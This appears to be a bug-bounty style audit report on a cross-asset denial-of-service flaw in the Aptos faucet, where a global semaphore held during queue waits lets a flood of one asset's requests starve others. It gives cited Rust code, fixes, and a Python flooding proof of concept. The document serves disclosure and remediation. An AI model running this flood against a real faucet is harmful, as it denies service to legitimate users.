# Audit Report

## Title
Cross-Asset Starvation via Global Semaphore Exhaustion in Faucet Request Processing

## Summary
The faucet service's request handling mechanism holds global semaphore permits during the entire queue waiting period, enabling attackers to exhaust all available permits by flooding one asset and thereby starving requests for all other assets from service.

## Finding Description

The faucet implements per-asset queues to ensure FIFO ordering within each asset type. However, when `max_concurrent_requests` is configured, a global semaphore limits concurrent request processing across ALL assets. [1](#0-0) 

The semaphore permit is acquired early in request processing: [2](#0-1) 

This permit is held for the entire duration of the `fund_inner` function: [3](#0-2) 

During this time, requests call `update_sequence_numbers()`, which contains a queue waiting loop where requests sleep repeatedly while not at the front of their asset's queue: [4](#0-3) 

**Attack Path:**
1. Attacker identifies the configured `max_concurrent_requests` limit (e.g., 100)
2. Attacker rapidly submits 100 requests for Asset A
3. All 100 requests acquire semaphore permits and enter Asset A's queue
4. The first request processes, but the remaining 99 wait in the loop at line 266, sleeping 1ms between iterations while holding their semaphore permits
5. Legitimate Asset B request arrives
6. Asset B request attempts to acquire a semaphore permit but fails (all 100 permits held by Asset A requests)
7. Asset B request immediately fails with "Server overloaded" error
8. Asset B is effectively starved from service while Asset A processes its backlog

The vulnerability violates the intended isolation between asset queues - while the queues themselves are properly separated, the shared semaphore creates a global bottleneck that enables cross-asset denial of service. [5](#0-4) 

## Impact Explanation

This is a **Medium severity** issue per Aptos bug bounty criteria as it causes service disruption requiring operational intervention:

- **Service Availability Impact**: Attackers can selectively prevent funding for specific assets, disrupting testnet/devnet operations
- **Operational Disruption**: Developers and testers cannot obtain funds for non-targeted assets during attack
- **Testnet Infrastructure**: While not affecting mainnet or consensus, the faucet is critical infrastructure for network testing and development
- **Targeted Attack**: Unlike generic network DoS (out of scope), this is an application-level logic flaw enabling precise asset-targeted starvation

The impact is limited to faucet availability and does not affect blockchain consensus, validator operations, or mainnet funds, placing it in the Medium category rather than High or Critical.

## Likelihood Explanation

**Likelihood: HIGH**

- **Low Complexity**: Attack requires only HTTP requests to the public faucet endpoint
- **No Authentication Required**: Most faucets accept unauthenticated requests
- **Easy Discovery**: Attacker can observe semaphore limits through "Server overloaded" responses
- **Minimal Resources**: Attack can be executed from a single machine with simple scripting
- **Common Configuration**: Production faucets typically configure `max_concurrent_requests` to prevent overload, making the vulnerability active in real deployments

The vulnerability will manifest whenever:
1. `max_concurrent_requests` is configured (recommended for production)
2. Multiple assets are supported via MintFunder
3. An attacker floods requests for one asset faster than they complete processing

## Recommendation

**Solution 1: Per-Asset Semaphore (Preferred)**

Replace the global semaphore with per-asset semaphores to maintain proper isolation:

```rust
// In HandlerConfig
pub max_concurrent_requests_per_asset: Option<usize>,

// In run.rs
let concurrent_requests_semaphores: HashMap<String, Arc<Semaphore>> = 
    funder.get_asset_names()
        .iter()
        .map(|asset| {
            (asset.clone(), Arc::new(Semaphore::new(
                self.handler_config.max_concurrent_requests_per_asset.unwrap_or(100)
            )))
        })
        .collect();
```

**Solution 2: Early Permit Release**

Release the semaphore permit before entering the queue waiting loop, acquiring a new "processing permit" only when at queue front. This requires adding a second semaphore for actual processing work.

**Solution 3: Timeout-Based Permit Holding**

Implement permit timeout logic that releases permits if requests wait too long in queue, though this adds complexity.

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Cross-Asset Starvation Attack on Aptos Faucet
Demonstrates how flooding Asset A requests starves Asset B
"""
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

FAUCET_URL = "http://localhost:8081/fund"
SEMAPHORE_LIMIT = 10  # Adjust based on configured max_concurrent_requests

def flood_asset_a():
    """Send requests for Asset A to exhaust semaphore"""
    for i in range(SEMAPHORE_LIMIT * 2):
        try:
            response = requests.post(
                FAUCET_URL,
                json={
                    "address": f"0x{'a'*64}",
                    "amount": 100
                },
                params={"asset": "AssetA"},
                timeout=30
            )
            print(f"Asset A request {i}: {response.status_code}")
        except Exception as e:
            print(f"Asset A request {i} failed: {e}")
        time.sleep(0.1)  # Slow enough to keep in queue

def request_asset_b():
    """Attempt to fund Asset B while Asset A floods"""
    time.sleep(2)  # Wait for Asset A to exhaust semaphore
    try:
        response = requests.post(
            FAUCET_URL,
            json={
                "address": f"0x{'b'*64}",
                "amount": 100
            },
            params={"asset": "AssetB"},
            timeout=5
        )
        print(f"Asset B request: {response.status_code} - {response.text}")
        # Expected: 503 "Server overloaded" while Asset A processes
    except Exception as e:
        print(f"Asset B request failed: {e}")

if __name__ == "__main__":
    print("Starting cross-asset starvation attack...")
    
    # Start flooding Asset A in background
    flood_thread = threading.Thread(target=flood_asset_a)
    flood_thread.start()
    
    # Attempt Asset B requests (should be blocked)
    with ThreadPoolExecutor(max_workers=5) as executor:
        for _ in range(5):
            executor.submit(request_asset_b)
            time.sleep(1)
    
    flood_thread.join()
    print("Attack complete. Asset B requests were starved.")
```

**Expected Result**: Asset B requests fail with "Server overloaded" (503) while Asset A requests process normally, demonstrating cross-asset starvation through semaphore exhaustion.

## Notes

The vulnerability exists at the intersection of three design elements:
1. Global semaphore for concurrency control (lines 93-96 in run.rs)
2. Per-asset queue isolation (line 218 in mint.rs) 
3. Long-duration permit holding during queue waits (lines 246-266 in common.rs)

While each component is individually reasonable, their combination enables cross-asset starvation. The fix requires either per-asset semaphores to maintain isolation or restructuring permit acquisition to minimize hold duration.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L49-52)
```rust
    /// The maximum number of requests the tap instance should handle at once.
    /// This allows the tap to avoid overloading its Funder, as well as to
    /// signal to a healthchecker that it is overloaded (via `/`).
    pub max_concurrent_requests: Option<usize>,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L294-309)
```rust
        let (checker_data, bypass, _semaphore_permit) = self
            .preprocess_request(&fund_request, source_ip, header_map, dry_run)
            .await?;

        // Fund the account - pass asset directly, funder will use its configured default if None
        let asset_for_logging = asset.clone();
        let fund_result = self
            .funder
            .fund(
                fund_request.amount,
                checker_data.receiver,
                asset,
                false,
                bypass,
            )
            .await;
```

**File:** crates/aptos-faucet/core/src/funder/common.rs (L245-266)
```rust
            // Check if this request is at the front of the queue for this asset
            let requests_map = outstanding_requests.read().await;
            let is_at_front = if let Some(queue) = requests_map.get(asset_name) {
                queue.first() == Some(&request_key)
            } else {
                false
            };

            if is_at_front {
                // There might have been two requests with the same parameters, so we ensure that
                // we only pop off one of them. We do a read lock first since that is cheap,
                // followed by a write lock.
                drop(requests_map);
                let mut requests_map = outstanding_requests.write().await;
                if let Some(queue) = requests_map.get_mut(asset_name) {
                    if queue.first() == Some(&request_key) {
                        queue.remove(0);
                    }
                }
                break;
            }
            tokio::time::sleep(tokio::time::Duration::from_millis(1)).await;
```

**File:** crates/aptos-faucet/core/src/funder/mint.rs (L218-218)
```rust
    outstanding_requests: RwLock<HashMap<String, Vec<(AccountAddress, u64)>>>,
```
